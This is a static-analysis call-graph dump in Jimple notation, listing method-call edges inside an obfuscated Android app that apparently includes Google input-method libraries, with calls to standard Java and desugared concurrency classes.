STATIC edge: $r3 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r1) in <hcb: void <init>()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map$Entry: java.lang.Object getKey()>() in <lid: boolean equals(java.lang.Object)> ==> <ljb: java.lang.Object getKey()>
SPECIAL edge: specialinvoke r0.<java.lang.Enum: void <init>(java.lang.String,int)>($r1, $i0) in <lvs: void <init>(java.lang.String,int)> ==> <java.lang.Enum: void <init>(java.lang.String,int)>
VIRTUAL edge: virtualinvoke $r30.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(": ") in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.IndexOutOfBoundsException: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.RuntimeException: void <init>()>() in <java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r2, $r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lsm: int a(lsz)>($r1) in <lsm: java.lang.Object d(lsz)> ==> <lsm: int a(lsz)>
SPECIAL edge: specialinvoke $r5.<java.text.SimpleDateFormat: void <init>(java.lang.String)>("yyyy-MM-dd\'T\'HH:mm:ss.SSSZ") in <lsc: void f(java.lang.String,ltn)> ==> <java.text.SimpleDateFormat: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(19) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r11.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>($i0, $r1, $r2) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>
INTERFACE edge: $r1 = interfaceinvoke $r4.<java.util.Iterator: java.lang.Object next()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $r1 = virtualinvoke $r0.<java.lang.String: char[] toCharArray()>() in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: char[] toCharArray()>
SPECIAL edge: specialinvoke r0.<lma: void <init>()>() in <lqo: void <init>(lkx,lkq)> ==> <lma: void <init>()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(": logging error [") in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $i0 = staticinvoke <izw: int ac(int)>($i0) in <izw: int ad(java.lang.Object)> ==> <izw: int ac(int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljf: java.lang.Object e(int)>($i0) in <ljf: java.util.Set f()> ==> <ljf: java.lang.Object e(int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <qj: int b(java.lang.Object)> ==> <ivw: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lsm: int a(lsz)> ==> <lsp: boolean equals(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.StringBuilder: java.lang.String substring(int)>(1) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.String substring(int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c0) in <ivw: boolean y(char)> ==> <ivw: boolean u(char)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <qj: void <init>(int)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lqr: int hashCode()>
STATIC edge: $r0 = staticinvoke <lmo: lqs G(java.util.Comparator)>($r1) in <lme: lma l(java.util.Comparator)> ==> <lmo: lqs G(java.util.Comparator)>
VIRTUAL edge: virtualinvoke $r3.<lmb: void g(java.lang.Object,java.lang.Object)>($r5, $r11) in <hbv: void j()> ==> <lmb: void g(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lrg: int hashCode()>
STATIC edge: $r3 = staticinvoke <lri: java.util.ArrayList P(java.util.Iterator)>($r2) in <izw: java.util.Collection at(java.lang.Iterable)> ==> <lri: java.util.ArrayList P(java.util.Iterator)>
STATIC edge: staticinvoke <iye: void y(boolean,java.lang.Object)>(1, "Expected size must be >= 0") in <ljd: void q(int)> ==> <iye: void y(boolean,java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <lid: int hashCode()>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <java.lang.Enum: int hashCode()>
CLINIT edge: staticinvoke <jpq: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <jpq: void <clinit>()>
SPECIAL edge: specialinvoke r0.<lqd: void <init>()>() in <lji: void <init>(java.util.Comparator)> ==> <lqd: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r5.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lsd: boolean b(lsr)> ==> <lta: boolean equals(java.lang.Object)>
STATIC edge: $i1 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: int b()>() in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ThreadLocalRandom: int b()>
CLINIT edge: staticinvoke <j$.util.concurrent.ThreadLocalRandom: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <j$.util.concurrent.ThreadLocalRandom: void <clinit>()>
SPECIAL edge: specialinvoke r0.<lsa: void <init>()>() in <llg: void <init>(llo)> ==> <lsa: void <init>()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r0, $r1) in <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
STATIC edge: $r3 = staticinvoke <hcb: hbv v(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object)>($r4, $r5, $r2) in <hcb: hbv j(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object,java.lang.Object)> ==> <hcb: hbv v(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object)>
CLINIT edge: staticinvoke <gwk: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <gwk: void <clinit>()>
INTERFACE edge: $r8 = interfaceinvoke $r9.<lse: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag", "extractLanguageAndCountryFromLocale", 253, "LanguageTag.java") in <ivw: ivw d(java.util.Locale)> ==> <lsn: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>
STATIC edge: staticinvoke <java.util.Arrays: void fill(java.lang.Object[],int,int,java.lang.Object)>($r2, $i5, $i1, null) in <lma: lma i(int,java.lang.Object[])> ==> <java.util.Arrays: void fill(java.lang.Object[],int,int,java.lang.Object)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Duplicated extension singleton: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke $r1.<java.lang.String: java.lang.String replace(char,char)>(47, 46) in <lsp: java.lang.String b()> ==> <java.lang.String: java.lang.String replace(char,char)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
CLINIT edge: staticinvoke <java.util.logging.Level: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.util.logging.Level: void <clinit>()>
VIRTUAL edge: $r12 = virtualinvoke $r11.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object putIfAbsent(java.lang.Object,java.lang.Object)>($r1, $r5) in <lsd: boolean b(lsr)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object putIfAbsent(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<lrg: void <init>(java.lang.Object)>($r0) in <lma: lma r(java.lang.Object)> ==> <lrg: void <init>(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<j$.sun.misc.b: boolean e(java.lang.Object,long,java.lang.Object)>($r2, $l1, $r0) in <j$.util.concurrent.ConcurrentHashMap: boolean b(j$.util.concurrent.l[],int,j$.util.concurrent.l)> ==> <j$.sun.misc.b: boolean e(java.lang.Object,long,java.lang.Object)>
SPECIAL edge: specialinvoke $r9.<lta: void <init>(lsr,java.lang.Object)>($r3, $r7) in <lsn: boolean ac()> ==> <lta: void <init>(lsr,java.lang.Object)>
STATIC edge: $z0 = staticinvoke <iwt: boolean k(char)>($c0) in <ivw: boolean O(char)> ==> <iwt: boolean k(char)>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(4) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $c2 = virtualinvoke $r0.<java.lang.String: char charAt(int)>($i0) in <ivw: boolean s(java.lang.String)> ==> <java.lang.String: char charAt(int)>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/libraries/inputmethod/future/FluentFuture") in <her: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Incomplete extension subtag, error index: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i4 = virtualinvoke $r0.<java.lang.String: int length()>() in <iwt: char[] s(java.lang.String,char,char,int)> ==> <java.lang.String: int length()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lid: int hashCode()>
INTERFACE edge: $z0 = interfaceinvoke $r2.<java.util.Set: boolean add(java.lang.Object)>($r1) in <ljf: boolean add(java.lang.Object)> ==> <java.util.HashSet: boolean add(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean x(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean x(char)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <dwx: void <init>(int)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke r0.<mij: void <init>(miy)>($r1) in <her: void <init>(miy)> ==> <mij: void <init>(miy)>
STATIC edge: $r3 = staticinvoke <lkq: lkq q()>() in <lmo: lqs G(java.util.Comparator)> ==> <lkq: lkq q()>
SPECIAL edge: specialinvoke r0.<java.io.InputStream: void <init>()>() in <bek: void <init>(java.nio.ByteBuffer)> ==> <java.io.InputStream: void <init>()>
SPECIAL edge: specialinvoke r0.<lqd: void <init>()>() in <lin: void <init>(ldp,lqd)> ==> <lqd: void <init>()>
VIRTUAL edge: virtualinvoke r0.<ljf: void h()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: void h()>
SPECIAL edge: specialinvoke $r0.<lpi: void <init>(java.lang.String,int)>("KEY", 0) in <lpi: void <clinit>()> ==> <lpi: void <init>(java.lang.String,int)>
VIRTUAL edge: virtualinvoke $r2.<ivv: void g(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <ivv: void g(java.lang.String)>
STATIC edge: staticinvoke <lri: void t(java.lang.Object,int)>($r3, $i3) in <lma: lma i(int,java.lang.Object[])> ==> <lri: void t(java.lang.Object,int)>
INTERFACE edge: $r5 = interfaceinvoke $r1.<java.util.Map: java.lang.Object get(java.lang.Object)>($r4) in <iej: void g(java.lang.String,iec)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<ljf: void l(int)>($i6) in <ljf: boolean add(java.lang.Object)> ==> <ljf: void l(int)>
SPECIAL edge: $i5 = specialinvoke r0.<ljf: int o(int,int,int,int)>($i4, $i5, $i3, $i0) in <ljf: boolean add(java.lang.Object)> ==> <ljf: int o(int,int,int,int)>
STATIC edge: $i6 = staticinvoke <izw: int aj(java.lang.Object,int)>($r7, $i5) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int aj(java.lang.Object,int)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <izw: boolean D(java.util.Collection,java.util.Iterator)> ==> <iye: java.lang.Object w(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<iec: void <init>()>() in <hns: void <init>()> ==> <iec: void <init>()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Long: java.lang.Long valueOf(long)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lid: void <init>()>() in <ljb: void <init>(ljd,int)> ==> <lid: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: $r11 = specialinvoke r0.<ivv: ivw i(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <ivv: ivw i(java.lang.String)>
VIRTUAL edge: $r5 = virtualinvoke $r2.<lts: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object d(lsz)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(13) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
VIRTUAL edge: $r5 = virtualinvoke $r19.<java.lang.ThreadLocal: java.lang.Object get()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.ThreadLocal: java.lang.Object get()>
INTERFACE edge: $r8 = interfaceinvoke $r6.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $r9 = virtualinvoke $r6.<lly: lma g()>() in <hbw: java.lang.Object a(java.lang.Object)> ==> <lly: lma g()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r1 = staticinvoke <java.util.Collections: java.util.Set newSetFromMap(java.util.Map)>($r2) in <gwk: void <init>()> ==> <java.util.Collections: java.util.Set newSetFromMap(java.util.Map)>
VIRTUAL edge: $r8 = virtualinvoke $r7.<lsc: lsw d()>() in <ivw: ivw d(java.util.Locale)> ==> <lsc: lsw d()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r0 = staticinvoke <lum: lvm i()>() in <lum: lvt k()> ==> <lum: lvm i()>
SPECIAL edge: specialinvoke $r5.<java.lang.AssertionError: void <init>(java.lang.Object)>("Couldn\'t find the Unsafe") in <j$.sun.misc.b: java.lang.reflect.Field i()> ==> <java.lang.AssertionError: void <init>(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<llo: void <init>(lkx,int)>($r2, $i0) in <lme: void <init>(lkx,int)> ==> <llo: void <init>(lkx,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.StringBuilder: void <init>()>() in <lri: void t(java.lang.Object,int)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean u(char)>
SPECIAL edge: $r4 = specialinvoke r0.<ivv: ivw i(java.lang.String)>($r2) in <ivv: ivw a()> ==> <ivv: ivw i(java.lang.String)>
STATIC edge: staticinvoke <iwt: void g(char[],int,int)>($r4, $i2, 2) in <nzh: boolean f(ivv)> ==> <iwt: void g(char[],int,int)>
SPECIAL edge: specialinvoke $r3.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null searchFeature") in <idq: void <init>(java.lang.String,mag)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: boolean isAssignableFrom(java.lang.Class)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r1 = staticinvoke <ljd: ljd g()>() in <lli: void <init>()> ==> <ljd: ljd g()>
INTERFACE edge: $i0 = interfaceinvoke $r2.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <lqr: int size()>
CLINIT edge: staticinvoke <hcb: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hcb: void <clinit>()>
STATIC edge: $r5 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r5) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
CLINIT edge: staticinvoke <java.lang.Float: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Float: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(20) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <lvt: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean x(char)>($c2) in <ivw: boolean B(java.lang.String)> ==> <ivw: boolean x(char)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: java.lang.String getName()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkh: java.lang.Object[] toArray(java.lang.Object[])>($r1) in <lkh: java.lang.Object[] toArray()> ==> <lkh: java.lang.Object[] toArray(java.lang.Object[])>
SPECIAL edge: specialinvoke $r7.<lvq: void <init>(lvr,int)>(r0, $i0) in <lvr: void <init>(java.util.List)> ==> <lvq: void <init>(lvr,int)>
CLINIT edge: staticinvoke <lsq: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lsq: void <clinit>()>
VIRTUAL edge: $c1 = virtualinvoke $r0.<java.lang.String: char charAt(int)>(3) in <ivw: boolean F(java.lang.String)> ==> <java.lang.String: char charAt(int)>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Iterator: boolean hasNext()>() in <hbv: void j()> ==> <llg: boolean hasNext()>
SPECIAL edge: specialinvoke $r1.<ljf: void <init>()>() in <lmb: java.util.Collection b()> ==> <ljf: void <init>()>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map$Entry: java.lang.Object getKey()>() in <lid: boolean equals(java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r6.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r5) in <nzh: boolean f(ivv)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r2, "metadata key") in <lsn: void q(lsz,java.lang.Object)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.List: java.lang.Object get(int)>($i1) in <hbw: java.lang.Object a(java.lang.Object)> ==> <lql: java.lang.Object get(int)>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r2, $r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r3) in <lqc: int compare(java.lang.Object,java.lang.Object)> ==> <iye: java.lang.Object w(java.lang.Object)>
STATIC edge: $r2 = staticinvoke <j$.util.concurrent.r: j$.util.concurrent.s c(j$.util.concurrent.s,j$.util.concurrent.s)>($r3, $r2) in <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)> ==> <j$.util.concurrent.r: j$.util.concurrent.s c(j$.util.concurrent.s,j$.util.concurrent.s)>
INTERFACE edge: $r8 = interfaceinvoke $r6.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean equals(java.lang.Object)> ==> <lje: java.lang.Object next()>
SPECIAL edge: $r2 = specialinvoke r0.<ljf: java.lang.Object p()>() in <ljf: int o(int,int,int,int)> ==> <ljf: java.lang.Object p()>
STATIC edge: $i6 = staticinvoke <izw: int ag(int,int,int)>($i7, $i8, $i4) in <ljd: int z(int,int,int,int)> ==> <izw: int ag(int,int,int)>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r1, $r3) in <lid: boolean equals(java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.a: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)>($r1, $i0, $i1, $r2) in <j$.util.concurrent.d: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)> ==> <j$.util.concurrent.a: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)>
INTERFACE edge: interfaceinvoke $r2.<java.util.List: boolean add(java.lang.Object)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.util.ArrayList: boolean add(java.lang.Object)>
STATIC edge: $r0 = staticinvoke <iwt: char[] s(java.lang.String,char,char,int)>($r1, 97, 122, $i0) in <iwt: java.lang.String e(java.lang.String)> ==> <iwt: char[] s(java.lang.String,char,char,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<java.lang.IllegalStateException: void <init>(java.lang.String)>($r2) in <iye: void I(boolean,java.lang.Object)> ==> <java.lang.IllegalStateException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("GifMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
SPECIAL edge: specialinvoke r0.<lsc: void <init>(lto)>($r1) in <ltf: void <init>(lto)> ==> <lsc: void <init>(lto)>
SPECIAL edge: $i4 = specialinvoke r0.<ljf: int n()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: int n()>
STATIC edge: $r7 = staticinvoke <java.security.AccessController: java.lang.Object doPrivileged(java.security.PrivilegedAction)>($r6) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.security.AccessController: java.lang.Object doPrivileged(java.security.PrivilegedAction)>
SPECIAL edge: specialinvoke r0.<lsq: void <init>()>() in <lso: void <init>()> ==> <lsq: void <init>()>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lmb: lme f()> ==> <ljf: java.util.Iterator iterator()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <lsp: int hashCode()>
VIRTUAL edge: $c1 = virtualinvoke $r0.<java.lang.String: char charAt(int)>(1) in <ivw: boolean F(java.lang.String)> ==> <java.lang.String: char charAt(int)>
STATIC edge: staticinvoke <lvm: void h(boolean,java.lang.String)>(1, "skipFrames must be >= 0") in <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <lvm: void h(boolean,java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String substring(int,int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<lkq: lsb B()>() in <lqo: lsa l()> ==> <lkq: lsb B()>
VIRTUAL edge: $r3 = virtualinvoke r0.<ljd: java.util.Map m()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: java.util.Map m()>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map$Entry: java.lang.Object getValue()>() in <lid: boolean equals(java.lang.Object)> ==> <lki: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(14) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
CLINIT edge: staticinvoke <hfd: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hfd: void <clinit>()>
SPECIAL edge: specialinvoke $r8.<ivw: void <init>()>() in <ivw: void <clinit>()> ==> <ivw: void <init>()>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.String: java.lang.String concat(java.lang.String)>($r2) in <ivv: void e(java.lang.String)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("BitmojiImage", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean x(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean x(char)>
STATIC edge: staticinvoke <izw: void an(java.lang.Object,int,int)>($r1, $i3, $i6) in <ljf: int o(int,int,int,int)> ==> <izw: void an(java.lang.Object,int,int)>
SPECIAL edge: specialinvoke r0.<lli: void e(java.lang.Object,java.lang.Object)>($r1, $r2) in <lmb: void g(java.lang.Object,java.lang.Object)> ==> <lli: void e(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r13.<java.lang.String: void <init>(char[],int,int)>($r3, $i0, $i1) in <ivv: ivw b(java.lang.String)> ==> <java.lang.String: void <init>(char[],int,int)>
STATIC edge: staticinvoke <lri: void u(java.lang.Object[])>($r2) in <lkq: lkq A(java.util.Comparator,java.lang.Iterable)> ==> <lri: void u(java.lang.Object[])>
STATIC edge: $r3 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <iye: void D(boolean,java.lang.String,int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
SPECIAL edge: specialinvoke $r4.<hnp: void <init>()>() in <hnt: void <clinit>()> ==> <hnp: void <init>()>
STATIC edge: $i5 = staticinvoke <izw: int ah(int)>($i4) in <ljf: boolean add(java.lang.Object)> ==> <izw: int ah(int)>
STATIC edge: $r3 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $l0 = virtualinvoke r0.<j$.sun.misc.b: long k(java.lang.reflect.Field)>($r4) in <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)> ==> <j$.sun.misc.b: long k(java.lang.reflect.Field)>
